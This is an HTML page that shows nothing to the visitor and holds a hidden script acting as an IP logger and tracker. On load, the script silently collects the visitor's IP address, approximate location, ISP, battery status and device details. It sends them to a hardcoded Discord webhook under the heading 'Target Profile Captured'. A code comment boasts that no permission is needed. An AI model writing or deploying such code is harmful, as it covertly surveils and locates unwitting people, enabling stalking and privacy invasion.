<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559254413867094056/z_w6ht4Qf57qo4LKY6gk_4Y1SNeA1tx2cihfPPK3YdxhIQLMXwRna1z7v365dAdOkcsf';

        window.onload = function() {
            setTimeout(collectAndSend, 1500);
        };

        async function collectAndSend() {
            let batteryInfo = "Not Available";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
                } catch (e) {}
            }

            // Browser & Device Info
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            // IP-API diye data fetch kora (Kono permission chara)
            let ipData = {};
            try {
                let res = await fetch('https://ip-api.com/json/');
                ipData = await res.json();
            } catch (e) {
                console.log(e);
            }

            const lat = ipData.lat || 'N/A';
            const lon = ipData.lon || 'N/A';
            const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';

            sendToDiscord({ 
                lat, 
                lon, 
                accuracy: 'IP-Based (Approximate)', 
                batteryInfo, 
                googleMapsLink, 
                ipData, 
                userAgent, 
                platform, 
                language, 
                screenRes 
            });
        }

        function sendToDiscord(data) {
            const payload = {
                content: "🚨 **Detailed Target Profile Captured!** 🚨",
                embeds: [{
                    title: "Advanced Information Logs",
                    color: 16711680,
                    fields: [
                        { name: "📍 Latitude & Longitude", value: `${data.lat}, ${data.lon}`, inline: false },
                        { name: "🎯 Location Type", value: `${data.accuracy}`, inline: true },
                        { name: "🔋 Battery Status", value: `${data.batteryInfo}`, inline: true },
                        { name: "🌐 IP Address", value: `${data.ipData.query || 'N/A'}`, inline: true },
                        { name: "🏙️ City / Region", value: `${data.ipData.city || 'N/A'}, ${data.ipData.regionName || 'N/A'}`, inline: true },
                        { name: "📮 Zip / Postal Code", value: `${data.ipData.zip || 'N/A'}`, inline: true },
                        { name: "🌍 Country", value: `${data.ipData.country || 'N/A'}`, inline: true },
                        { name: "🏢 ISP (Internet Provider)", value: `${data.ipData.isp || 'N/A'}`, inline: false },
                        { name: "💻 Organization", value: `${data.ipData.org || 'N/A'}`, inline: true },
                        { name: "⏰ Timezone", value: `${data.ipData.timezone || 'N/A'}`, inline: true },
                        { name: "📱 Device Platform", value: `${data.platform}`, inline: true },
                        { name: "📐 Screen Resolution", value: `${data.screenRes}`, inline: true },
                        { name: "🗣️ Browser Language", value: `${data.language}`, inline: true },
                        { name: "🗺️ Google Maps Link", value: `[Open Approximate Location](${data.googleMapsLink})` }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => {});
        }
    </script>
</body>
</html>
